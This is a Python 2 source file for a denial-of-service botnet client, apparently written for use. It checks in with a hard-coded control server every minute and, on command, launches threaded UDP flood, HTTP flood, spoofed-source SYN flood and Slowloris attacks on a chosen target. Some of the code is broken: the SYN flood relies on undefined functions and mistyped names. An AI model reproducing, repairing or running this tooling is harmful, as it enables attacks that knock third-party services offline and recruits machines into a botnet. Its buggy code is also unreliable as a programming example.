import SocketServer
import socket
import threading
import time
import socket
import urllib2
import random
import os

class zombie(SocketServer.BaseRequestHandler):
    def handle(self):
        self.data = self.request.recv(1024).strip()
        attack, target, timeout, port, threads = self.data.split(" ")
        kwargs = {'attack':attack, 'target':target, 'timeout':timeout, 'port':port}
        self.request.sendall("ACK")
        if attack == "udp":
            fun = attackUDPFlood
        elif attack == "http":
            fun = attackHTTPFlood
        elif attack == "syn":
            fun = attackSYNFlood
        elif attack == "slowloris":
            fun = attackSlowLoris
        for i in xrange(int(threads)):
            attacker = fun(**kwargs)
            if attack == "slowloris": time.sleep(1)
            attacker.start()

class attackUDPFlood(threading.Thread):
    def __init__(self, **kwargs):
        threading.Thread.__init__(self)
        self.timeout = int(kwargs['timeout'])
        self.target = kwargs['target']
        self.port = int(kwargs['port'])

    def run(self):
        victim = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        MESSAGE = os.urandom(1024)

        start = time.time()
        while time.time() - start < self.timeout:
            victim.sendto(MESSAGE, (self.target, self.port))

class attackHTTPFlood(threading.Thread):
    def __init__(self, **kwargs):
        threading.Thread.__init__(self)
        self.timeout = kwargs['timeout']
        self.target = kwargs['target']

    def run(self):
        start = time.time()
        while time.time() - start < self.timeout:
            try:
                res = urllib2.urlopen(self.target)
            except IOError:
                print "Could not open ", self.target

"""
class attackSYNFlood(threading.Thread):
    def __init__(self, **kwargs):
        threading.Thread.__init__(self)
        self.timeout = kwargs['timeout']
        self.target = kwargs['target']
        self.port = int(kwargs['port'])

    def run(self):
        start = time.time()
        while time.time() - start < self.timeout:
            ip = IP()
            ip.src = "{0}.{1}.{2}.{3}".format(random.randint(1,254),
                                     random.randint(1,254),
                                     random.randint(1,254),
                                     random.randint(1,254))
            ip.dst = self.target

            tcp = TCP()
            tcp.sport = random.randint(1,65535)
            tcp.dport = self.port
            tcp.flags = 'S'

            send(ip/tcp, verbose = 0)
"""

class attackSYNFlood(threading.Thread):
    def __init__(self, **kwargs):
        threading.Thread.__init__(self)
        self.timeout = kwargs['timeout']
        self.target = kwargs['target']
        self.port = int(kwargs['port'])

    # http://stackoverflow.com/questions/1767910/checksum-udp-calculation-python
    def _carry_around_add(self, a, b):
        c = a + b
        return (c & 0xffff) + (c >> 16)

    def _checksum(self, msg):
        s = 0
        for i in xrange(0, len(msg), 2):
            w = ord(msg[i]) + (ord(msg[i+1]) << 8)
            s = carr_around_add(s, w)
        return ~s & 0xffff

    def run(self):
        start = time.time()

        # create the custom TCP packet
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            sIP = "{0}.{1}.{2}.{3}".format(random.randint(1,254),
                                           random.randint(1,254),
                                           random.randint(1,254),
                                           random.randint(1,254))
            # IP header fields
            version               = 4
            ihl                   = 5
            version_ihl           = (version << 4) + ihl
            dscp_ecn              = 0
            total_length          = 40
            # not sure what to set this to?
            identification        = 0
            flags_fragment_offset = 0
            ttl                   = 255
            protocol              = socket.IPPROTO_TCP
            checksum              = 0

            ip_header = pack('!BBHHHBBH4s4s', version_ihl, dscp_ecn, total_length,
                    identification, flags_fragment_offset, ttl, protocol, checksum,
                    socket.inet_aton(sIP), socket.inet_aton(self.target))

            # TCP header fields
            source_port           = np.randint(1, 65535)
            dest_port             = self.port
            seq                   = 0
            ack                   = 0
            data_offset           = 5
            data_offset_res       = (data_offset << 4) + 0
            # this is 00000010 where we set 1 for SYN
            tcp_flags             = 2
            window                = socket.htons(5840)
            checksum              = 0
            urgent_pointer        = 0

            tcp_header = pack('!HHLLBBHHH', source_port, dest_port, seq, ack,
                    data_offset_res, tcp_flags, window, checksum, urgent_pointer)

            # calculate the correct checksum
            checksum_packet = pack('!4s4sBHH', socket.inet_aton(sIP),
                    socket.inet_aton(self.target), 0, socket.IPPROTO_TCP,
                    len(tcp_header))
            checksum_packet = checksum_packet + tcp_header
            tcp_header = pack('!HHLBBHHH', source_port, dest_port, seq, ack,
                    data_offset_res, tcp_flags, window, _checksum(checksum_packet),
                    urgent_pointer)

            packet = ip_header + tcp_header
        except socket.error, mgs:
            print "Socket error: ", str(msg[0]), str(msg[1])

        # flood the target
        while time.time() - start < self.timeout:
            s.sendto(packet, (self.target, 0))


class attackSlowLoris(threading.Thread):
    def __init__(self, **kwargs):
        threading.Thread.__init__(self)
        self.timeoutAttack = kwargs['timeout']
        self.target = kwargs['target']

    def run(self):
        req = 'GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:25.0) Gecko/20100101 Firefox/25.0\r\n' % (self.target)
        start = time.time()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target, 80))
            index = 0
            while time.time() - start < self.timeoutAttack and index < len(req):
                time.sleep(3)
                s.send(req[index])
                index += 1
        except Exception, e:
            print e

class registerIP(threading.Thread):
    def __init__(self, HOST, PORT):
        threading.Thread.__init__(self)
        self.HOST = HOST
        self.PORT = PORT

    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.HOST, self.PORT))
            sock.sendall(socket.gethostbyname(socket.gethostname()))
            time.sleep(60)

class waitForInstructions(threading.Thread):
    def __init__(self, HOST, PORT):
        threading.Thread.__init__(self)
        self.HOST = HOST
        self.PORT = PORT

    def run(self):
        server = SocketServer.TCPServer((self.HOST, self.PORT), zombie)
        server.serve_forever()

if __name__ == '__main__':
    controlIP = "173.250.173.50"
    zombieIP = socket.gethostbyname(socket.gethostname())
    controlPORT = 14000
    getInstrPORT = 15000

    instr = waitForInstructions(zombieIP, getInstrPORT)
    regis = registerIP(controlIP, controlPORT)

    instr.start()
    regis.start()
